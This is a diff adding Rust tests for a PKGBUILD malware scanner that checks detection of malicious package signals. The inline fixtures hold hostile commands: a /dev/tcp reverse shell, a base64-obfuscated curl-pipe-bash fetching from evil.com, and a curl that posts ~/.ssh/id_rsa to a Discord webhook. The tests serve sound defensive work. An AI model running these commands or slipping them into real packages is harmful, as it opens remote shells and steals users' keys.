@@ -1,0 +1,177 @@
+use traur::coordinator::scan_pkgbuild;
+use traur::shared::scoring::Tier;
+
+#[test]
+fn test_curl_pipe_bash_detected_as_malicious() {
+    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
+    let result = scan_pkgbuild("firefox-fix-bin", pkgbuild);
+
+    assert_eq!(result.tier, Tier::Malicious, "curl|bash should trigger MALICIOUS tier");
+    assert!(
+        result.override_gate_fired.is_some(),
+        "Override gate should fire for curl|bash"
+    );
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(
+        signal_ids.contains(&"P-CURL-PIPE"),
+        "Should detect P-CURL-PIPE signal"
+    );
+}
+
+#[test]
+fn test_malicious_pkgbuild_detects_multiple_signals() {
+    let pkgbuild = include_str!("fixtures/malicious/curl_pipe_bash.PKGBUILD");
+    let result = scan_pkgbuild("firefox-fix-bin", pkgbuild);
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+
+    // Should detect URL shortener
+    assert!(
+        signal_ids.contains(&"P-URL-SHORTENER"),
+        "Should detect bit.ly URL shortener, got: {signal_ids:?}"
+    );
+
+    // Should detect raw IP
+    assert!(
+        signal_ids.contains(&"P-RAW-IP-URL"),
+        "Should detect raw IP URL, got: {signal_ids:?}"
+    );
+
+    // Should detect name impersonation (firefox-fix-bin)
+    assert!(
+        signal_ids.contains(&"B-NAME-IMPERSONATE"),
+        "Should detect name impersonation, got: {signal_ids:?}"
+    );
+}
+
+#[test]
+fn test_benign_pkgbuild_scores_low() {
+    let pkgbuild = include_str!("fixtures/benign/yay.PKGBUILD");
+    let result = scan_pkgbuild("yay", pkgbuild);
+
+    assert!(
+        result.tier <= Tier::Medium,
+        "Benign PKGBUILD should score LOW or MEDIUM, got {:?} (score: {})",
+        result.tier,
+        result.score
+    );
+    assert!(
+        result.override_gate_fired.is_none(),
+        "No override gate should fire for benign package"
+    );
+}
+
+#[test]
+fn test_reverse_shell_detected() {
+    let pkgbuild = r#"
+pkgname=evil-tool
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+source=('https://example.com/tool.tar.gz')
+sha256sums=('abc123')
+
+package() {
+    bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+}
+"#;
+    let result = scan_pkgbuild("evil-tool", pkgbuild);
+
+    assert_eq!(result.tier, Tier::Malicious);
+    assert!(result.override_gate_fired.is_some());
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(signal_ids.contains(&"P-REVSHELL-DEVTCP"));
+}
+
+#[test]
+fn test_base64_obfuscation_detected() {
+    let pkgbuild = r#"
+pkgname=sneaky
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+source=('https://example.com/src.tar.gz')
+sha256sums=('abc123')
+
+package() {
+    payload=$(echo "Y3VybCBodHRwOi8vZXZpbC5jb20vc2hlbGwuc2ggfCBiYXNo" | base64 -d)
+    eval "$payload"
+}
+"#;
+    let result = scan_pkgbuild("sneaky", pkgbuild);
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(
+        signal_ids.contains(&"P-BASE64"),
+        "Should detect base64 decoding, got: {signal_ids:?}"
+    );
+    assert!(
+        signal_ids.contains(&"P-EVAL-VAR"),
+        "Should detect eval $var, got: {signal_ids:?}"
+    );
+}
+
+#[test]
+fn test_checksum_skip_on_non_vcs() {
+    let pkgbuild = r#"
+pkgname=sketchy-bin
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+source=('https://example.com/sketchy.tar.gz')
+sha256sums=('SKIP')
+"#;
+    let result = scan_pkgbuild("sketchy-bin", pkgbuild);
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(
+        signal_ids.contains(&"P-SKIP-ALL"),
+        "Should detect SKIP checksums on non-VCS package, got: {signal_ids:?}"
+    );
+}
+
+#[test]
+fn test_checksum_skip_on_vcs_not_flagged() {
+    let pkgbuild = r#"
+pkgname=cool-tool-git
+pkgver=1.0.r42.abc1234
+pkgrel=1
+arch=('x86_64')
+source=('git+https://github.com/user/cool-tool.git')
+sha256sums=('SKIP')
+"#;
+    let result = scan_pkgbuild("cool-tool-git", pkgbuild);
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(
+        !signal_ids.contains(&"P-SKIP-ALL"),
+        "VCS packages should not be flagged for SKIP checksums"
+    );
+    assert!(
+        !signal_ids.contains(&"P-NO-CHECKSUMS"),
+        "VCS packages should not be flagged for missing checksums"
+    );
+}
+
+#[test]
+fn test_discord_webhook_detected() {
+    let pkgbuild = r#"
+pkgname=data-stealer
+pkgver=1.0
+pkgrel=1
+arch=('x86_64')
+source=('https://example.com/tool.tar.gz')
+sha256sums=('abc123')
+
+package() {
+    curl -X POST https://discord.com/api/webhooks/123456/ABCDEF -d "{\"content\":\"$(cat ~/.ssh/id_rsa)\"}"
+}
+"#;
+    let result = scan_pkgbuild("data-stealer", pkgbuild);
+
+    let signal_ids: Vec<&str> = result.signals.iter().map(|s| s.id.as_str()).collect();
+    assert!(signal_ids.contains(&"P-DISCORD-WEBHOOK"));
+    assert!(signal_ids.contains(&"P-SSH-ACCESS"));
+}
